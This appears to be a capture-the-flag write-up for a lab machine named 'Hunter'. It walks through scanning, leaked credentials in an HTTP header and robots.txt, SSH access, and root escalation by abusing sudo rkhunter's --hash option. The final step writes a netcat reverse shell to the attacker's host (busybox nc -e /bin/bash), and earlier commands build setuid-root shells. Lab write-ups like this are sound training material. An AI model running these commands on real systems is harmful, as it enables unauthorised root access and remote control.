# Hunter

## Recon

::: details nmap_scan.log.md
```log
Open ports, closed hearts.

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.0.2.168:22
Open 10.0.2.168:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.168
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 10.0 (protocol 2.0)
8080/tcp open  http    syn-ack Golang net/http server
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-favicon: Unknown favicon MD5: D58DB6BFC5A697F0567773A18D530102
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sat, 03 Jan 2026 08:19:21 GMT
|     Content-Length: 21
|     Content-Type: text/plain; charset=utf-8
|     Yes, thats a CTF :_(
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```
:::

## HTTP (8080)

```bash
└─$ curl http://10.0.2.168:8080/ -i
HTTP/1.1 200 OK
Date: Sat, 03 Jan 2026 08:19:20 GMT
Content-Length: 21
Content-Type: text/plain; charset=utf-8

Yes, thats a CTF :_(
```

```bash
└─$ curl http://10.0.2.168:8080/admin -i
HTTP/1.1 200 OK
Date: Sat, 03 Jan 2026 08:20:40 GMT
Content-Length: 13
Content-Type: text/plain; charset=utf-8

Invalid JWT.
```

```bash
└─$ ffuf -u 'http://10.0.2.168:8080/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -mc all -fs 21
admin                   [Status: 200, Size: 13, Words: 2, Lines: 2, Duration: 23ms]
beacon                  [Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 8ms]
```

Try POST?
```bash
└─$ curl http://10.0.2.168:8080/admin -i -X POST
HTTP/1.1 200 OK
X-Secret-Creds: hunterman:thisisnitriilcisi
Date: Sat, 03 Jan 2026 08:27:41 GMT
Content-Length: 13
Content-Type: text/plain; charset=utf-8

Invalid JWT.
```

## SSH

```bash
└─$ sshpass -p 'thisisnitriilcisi' ssh hunterman@10.0.2.168
hunter:~$ id
uid=1000(hunterman) gid=1000(hunterman) groups=1000(hunterman)
```

### User.txt

```bash
hunter:~$ cat user.txt
HMV{VcvaIKcezQVcvaIKcezQ}
```

## Privilege Escalation (huntergirl)

There's directories in `html`, but no content of server. Also `robots.txt` has different contents...
```bash
hunter:/var/www/html$ find
.
./beacon
./index
./admin
./robots.txt
hunter:/var/www/html$ cat index
Yes, thats a CTF :_(
hunter:/var/www/html$ cat robots.txt
h u n t e r g i r l:fickshitmichini
```

> Creds: `huntergirl:fickshitmichini`

```bash
hunter:/var/www/html$ su huntergirl
Password: fickshitmichini
/var/www/html $ id
uid=1001(huntergirl) gid=1001(huntergirl) groups=1001(huntergirl)
```

## Privilege Escalation (root)

```bash
~ $ sudo -l
Matching Defaults entries for huntergirl on hunter:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for huntergirl:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User huntergirl may run the following commands on hunter:
    (root) NOPASSWD: /usr/local/bin/rkhunter
```

```bash
~ $ sudo rkhunter
...
--hash {MD5 | SHA1 | SHA224 | SHA256 | SHA384 | SHA512 |
	 NONE | <command>}     Use the specified file hash function
...
```

Rootbash created, but no root?
```bash
~ $ echo $'#!/bin/bash\ninstall -m4777 /bin/bash /tmp/rootbash' > /tmp/hi
~ $ chmod +x /tmp/hi
~ $ sudo rkhunter --propupd --hash /tmp/hi
[ Rootkit Hunter version 1.4.6 ]
File created: searched for 173 files, found 100, missing hashes 100
~ $ /tmp/rootbash -p -c id
uid=1001(huntergirl) gid=1001(huntergirl) groups=1001(huntergirl)
```

Also `setuid` binaries failed
```bash
echo $'#include <unistd.h>\nvoid main() { setuid(0); setgid(0); execl("/bin/bash", "bash", NULL); }' | gcc -x c -static -o privesc -
echo $'#include <unistd.h>\nvoid main() { setuid(0); setgid(0); execl("/bin/sh", "sh", NULL); }' | gcc -x c -static -o privesc2 -
```

```bash
~ $ echo $'#!/bin/bash\nbusybox nc 10.0.2.149 4444 -e /bin/bash' > /tmp/hi
~ $ sudo rkhunter --propupd --hash /tmp/hi
---
└─$ penelope -p 4444
$ id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

### Root.txt

```bash
$ cat /root/root.txt
HMV{FhOpuXDUlZFhOpuXDUlZ}
```